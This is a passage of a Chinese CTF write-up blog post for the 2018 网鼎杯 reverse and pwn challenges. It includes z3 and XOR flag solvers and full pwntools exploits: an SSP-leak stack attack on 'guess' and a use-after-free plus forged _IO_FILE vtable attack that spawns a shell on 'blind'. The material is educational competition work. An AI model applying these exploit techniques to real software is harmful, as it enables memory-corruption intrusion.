class="line">s.add(abs(a-0) + abs(b-0) + abs(c-0) + abs(d-0) + abs(e-0) + abs(f-0) + abs(0-3) + abs(h-4) + 0 &#x3D;&#x3D; 717) </span><br><span class="line">s.add(abs(i-0) + abs(j-0) + abs(k-0) + abs(l-0) + abs(m-0) + abs(n-0) + abs(0-3) + abs(p-17) + 0 &#x3D;&#x3D; 729) </span><br><span class="line">s.add(abs(a-0) + abs(b-0) + abs(c-0) + abs(d-0) + abs(e-0) + abs(0-0) + abs(g-2) + abs(h-205) + 0 &#x3D;&#x3D; 731) </span><br><span class="line">s.add(abs(i-0) + abs(j-0) + abs(k-0) + abs(l-0) + abs(m-0) + abs(0-0) + abs(o-2) + abs(p-217) + 0 &#x3D;&#x3D; 724) </span><br><span class="line">s.add(abs(a-0) + abs(b-0) + abs(c-0) + abs(d-0) + abs(0-0) + abs(f-0) + abs(g-2) + abs(h-219) + 0 &#x3D;&#x3D; 738) </span><br><span class="line">s.add(abs(i-0) + abs(j-0) + abs(k-0) + abs(l-0) + abs(0-0) + abs(n-0) + abs(o-2) + abs(p-212) + 0 &#x3D;&#x3D; 708) </span><br><span class="line">s.add(abs(a-0) + abs(b-0) + abs(c-0) + abs(0-0) + abs(e-0) + abs(f-0) + abs(g-2) + abs(h-226) + 0 &#x3D;&#x3D; 738) </span><br><span class="line">s.add(abs(i-0) + abs(j-0) + abs(k-0) + abs(0-0) + abs(m-0) + abs(n-0) + abs(o-2) + abs(p-196) + 0 &#x3D;&#x3D; 718) </span><br><span class="line">s.add(abs(a-0) + abs(b-0) + abs(0-0) + abs(d-0) + abs(e-0) + abs(f-0) + abs(g-2) + abs(h-226) + 0 &#x3D;&#x3D; 749) </span><br><span class="line">s.add(abs(i-0) + abs(j-0) + abs(0-0) + abs(l-0) + abs(m-0) + abs(n-0) + abs(o-2) + abs(p-206) + 0 &#x3D;&#x3D; 728) </span><br><span class="line">s.add(abs(a-0) + abs(0-0) + abs(c-0) + abs(d-0) + abs(e-0) + abs(f-0) + abs(g-2) + abs(h-237) + 0 &#x3D;&#x3D; 744) </span><br><span class="line">s.add(abs(i-0) + abs(0-0) + abs(k-0) + abs(l-0) + abs(m-0) + abs(n-0) + abs(o-2) + abs(p-216) + 0 &#x3D;&#x3D; 732) </span><br><span class="line">s.add(abs(0-0) + abs(b-0) + abs(c-0) + abs(d-0) + abs(e-0) + abs(f-0) + abs(g-2) + abs(h-232) + 0 &#x3D;&#x3D; 758) </span><br><span class="line">s.add(abs(0-0) + abs(j-0) + abs(k-0) + abs(l-0) + abs(m-0) + abs(n-0) + abs(o-2) + abs(p-220) + 0 &#x3D;&#x3D; 733) </span><br><span class="line">print(s.check())</span><br><span class="line">mod &#x3D; s.model()</span><br><span class="line"></span><br><span class="line">chars &#x3D; [</span><br><span class="line">          mod[a],</span><br><span class="line">          mod[b],</span><br><span class="line">          mod[c],</span><br><span class="line">          mod[d],</span><br><span class="line">          mod[e],</span><br><span class="line">          mod[f],</span><br><span class="line">          mod[g],</span><br><span class="line">          mod[h],</span><br><span class="line">          mod[i],</span><br><span class="line">          mod[j],</span><br><span class="line">          mod[k],</span><br><span class="line">          mod[l],</span><br><span class="line">          mod[m],</span><br><span class="line">          mod[n],</span><br><span class="line">          mod[o],</span><br><span class="line">          mod[p]</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(chars)</span><br><span class="line">flag &#x3D; &#39;&#39;.join([chr(int(str(w))) for w in chars])</span><br><span class="line">flag &#x3D; flag[::-1]</span><br><span class="line">print(&#39;flag&#39; +flag[12:] + flag[8:12] + flag[0:4] + flag[4:8])</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/7434375-ff27623aed1f3aa2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag"></p>
+<h3 id="0x03-advanced"><a href="#0x03-advanced" class="headerlink" title="0x03 advanced"></a>0x03 advanced</h3><p>非预期<br>运行一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">welcome, here is your identification, please keep it in your pocket: 4b404c4b5648725b445845734c735949405c414d5949725c45495a51</span><br></pre></td></tr></table></figure>
+<p>直接拖IDA分析时候比较乱，看不出啥<br>不过观察pocket：<br>发现hex解码后xor “-,”(即按位异或0x45,0x44)即得flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;&quot;4b404c4b5648725b445845734c735949405c414d5949725c45495a51&quot;.decode(&quot;hex&quot;)</span><br><span class="line">key2&#x3D;&quot;-,&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">j&#x3D;0</span><br><span class="line">for i in key:</span><br><span class="line">  flag+&#x3D;chr(ord(i)^ord(key2[j%2]))</span><br><span class="line">  j+&#x3D;1</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d_with_a_template_phew&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="0x04-guess"><a href="#0x04-guess" class="headerlink" title="0x04 guess"></a>0x04 guess</h3><p>main处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400A86                 call    sub_4009A6</span><br></pre></td></tr></table></figure>
+<p>sub_4009A6中反调试call alarm<br>首先nop掉<br>看一下保护<br><img src="https://upload-images.jianshu.io/upload_images/7434375-5983d06073298edf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>看到程序开启了canary保护<br>看到main中程序调用方式以及gets漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> __WAIT_STATUS stat_loc; &#x2F;&#x2F; [rsp+14h] [rbp-8Ch]</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v6 &gt;&#x3D; v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 &#x3D; sub_400A11();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">gets((__int64)&amp;s2);</span><br></pre></td></tr></table></figure>
+<p>想到之前看的一篇文章：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;veritas501.space&#x2F;2017&#x2F;04&#x2F;28&#x2F;%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95&#x2F;</span><br></pre></td></tr></table></figure>
+<p>就是通过故意触发canary保护来ssp leak<br>因为触发canary之后会输出stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串<br>首先明确flag被main读入到栈中<br>我们需要获取栈地址<br>程序允许三次读入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1-&gt;覆盖argv[0]为got表地址leak libc</span><br><span class="line">2-&gt;利用environ来leak stack_addr</span><br><span class="line">3-&gt;利用栈地址打到flag</span><br></pre></td></tr></table></figure>
+<p>首先计算需要覆盖的距离：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp; __libc_argv[0]</span><br><span class="line">$8 &#x3D; (char **) 0x7fffffffdcc8</span><br><span class="line">gdb-peda$ p $rbp-0x40</span><br><span class="line">$13 &#x3D; (void *) 0x7fffffffdba0</span><br><span class="line">0x7fffffffdcc8-0x7fffffffdba0&#x3D;0x128</span><br></pre></td></tr></table></figure>
+<p>EXP:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&quot;.&#x2F;guess&quot;)</span><br><span class="line">elib&#x3D;ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">environ_off&#x3D; elib.symbols[&#39;environ&#39;]</span><br><span class="line">puts_off&#x3D;elib.symbols[&quot;puts&quot;]</span><br><span class="line">puts_got_addr&#x3D;elf.got[&quot;puts&quot;]</span><br><span class="line">p&#x3D;process(&quot;.&#x2F;guess&quot;)</span><br><span class="line">p.recvuntil(&quot;flag&quot;)</span><br><span class="line">p.sendline(&quot;A&quot;*0x128 + p64(puts_got_addr))</span><br><span class="line">print p.recvuntil(&quot;: &quot;)</span><br><span class="line">puts_addr&#x3D;u64(p.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line">environ_addr&#x3D;environ_off-puts_off+puts_addr</span><br><span class="line">p.recvuntil(&quot;flag&quot;)</span><br><span class="line">p.sendline(&quot;A&quot;*0x128 + p64(environ_addr))</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">stack_addr&#x3D;u64(p.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line">p.recvuntil(&quot;flag&quot;)</span><br><span class="line">p.sendline(&quot;A&quot;*0x128 + p64(stack_addr-0x168))</span><br><span class="line">p.recvuntil(&quot;: &quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x05-blind"><a href="#0x05-blind" class="headerlink" title="0x05 blind"></a>0x05 blind</h3><p>首先看到new：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( v1 &lt;&#x3D; 5 &amp;&amp; !ptr[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  ptr[v1] &#x3D; malloc(0x68uLL);</span><br><span class="line">  printf(&quot;Content:&quot;, &amp;s);</span><br><span class="line">  read_note((__int64)ptr[v1], 0x68u);</span><br><span class="line">  puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们建立的数据保存在堆中<br>并由全局变量数组ptr保存<br>同时在release中可以看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( v1 &lt;&#x3D; 5 &amp;&amp; ptr[v1] &amp;&amp; release_time &lt;&#x3D; 2 )</span><br><span class="line"> &#123;</span><br><span class="line">   free(ptr[v1]);</span><br><span class="line">   ++release_time;</span><br><span class="line">   puts(&quot;Done!&quot;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>free后没有置空指针，存在UAF<br>我们可以利用uaf来change被free过的chunk，构造fd来使堆块分配到bss段，同时ptr也在bss段，我们可以覆盖掉ptr数组中的指针，而后利用change进行任意地址写入<br>程序中存在后门：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008E3</span><br><span class="line">.text:00000000004008E3 sub_4008E3      proc near</span><br><span class="line">.text:00000000004008E3 ; __unwind &#123;</span><br><span class="line">.text:00000000004008E3                 push    rbp</span><br><span class="line">.text:00000000004008E4                 mov     rbp, rsp</span><br><span class="line">.text:00000000004008E7                 mov     edi, offset command ; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">.text:00000000004008EC                 call    system</span><br><span class="line">.text:00000000004008F1                 nop</span><br><span class="line">.text:00000000004008F2                 pop     rbp</span><br><span class="line">.text:00000000004008F3                 retn</span><br><span class="line">.text:00000000004008F3 ; &#125; &#x2F;&#x2F; starts at 4008E3</span><br></pre></td></tr></table></figure>
+<p>这里我们可以覆盖掉stdout的指针指向我们在bss段中构造的_IO_FILE结构，并将_IO_FILE_plus中的*vtable指向我们伪造的vtable(shell_addr)实现劫持程序流,从而调取shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">def new(index,content):</span><br><span class="line">    p.recvuntil(&#39;Choice:&#39;)</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.recvuntil(&#39;Index:&#39;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&#39;Content:&#39;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def change(index,content):</span><br><span class="line">    p.recvuntil(&#39;Choice:&#39;)</span><br><span class="line">    p.sendline(&#39;2&#39;)</span><br><span class="line">    p.recvuntil(&#39;Index:&#39;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&#39;Content:&#39;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def release(index):</span><br><span class="line">    p.recvuntil(&#39;Choice:&#39;)</span><br><span class="line">    p.sendline(&#39;3&#39;)</span><br><span class="line">    p.recvuntil(&#39;Index:&#39;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">p &#x3D; process(&#39;.&#x2F;blind&#39;)</span><br><span class="line">shell_addr&#x3D;0x4008E3</span><br><span class="line">new(0,&#39;1111&#39;)</span><br><span class="line">new(1,&#39;2222&#39;)</span><br><span class="line">release(0)</span><br><span class="line">change(0,p64(0x60203d) + &#39;\n&#39;)</span><br><span class="line">new(2,&#39;aaaa&#39;)</span><br><span class="line">payload&#x3D;&#39;aaa&#39; + &#39;a&#39;*0x10+p64(0x602020) + p64(0x602090) + p64(0x602090 + 0x68)+p64(0x602090 + 0x68*2) + p64(0x602090 + 0x68*3)</span><br><span class="line">new(3,payload)</span><br><span class="line">IO_payload&#x3D;p64(0x00000000fbad8000)+p64(0x602500)*7+p64(0x602501)+p64(0)*9+p64(0x602600)+p64(0)*8+p64(0x602090+0x68*3)</span><br><span class="line">vtable_payload&#x3D;p64(shell_addr)*13</span><br><span class="line">change(1,IO_payload[0:0x68])</span><br><span class="line">change(2,IO_payload[0x68:0xd0])</span><br><span class="line">change(3,IO_payload[0xd0:]+&#39;\n&#39;)</span><br><span class="line">change(4,vtable_payload)</span><br><span class="line">change(0,p64(0x602090)+&#39;\n&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Beijing"><span class="toc-number">1.</span> <span class="toc-text">0x01 Beijing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-blend"><span class="toc-number">2.</span> <span class="toc-text">0x02 blend</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-advanced"><span class="toc-number">3.</span> <span class="toc-text">0x03 advanced</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-guess"><span class="toc-number">4.</span> <span class="toc-text">0x04 guess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-blind"><span class="toc-number">5.</span> <span class="toc-text">0x05 blind</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&text=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&title=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&is_video=false&description=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网鼎杯第一场_Re&amp;&amp;部分Pwn&body=Check out this article: http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&title=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&title=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&title=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&title=网鼎杯第一场_Re&amp;&amp;部分Pwn" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/&name=网鼎杯第一场_Re&amp;&amp;部分Pwn&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
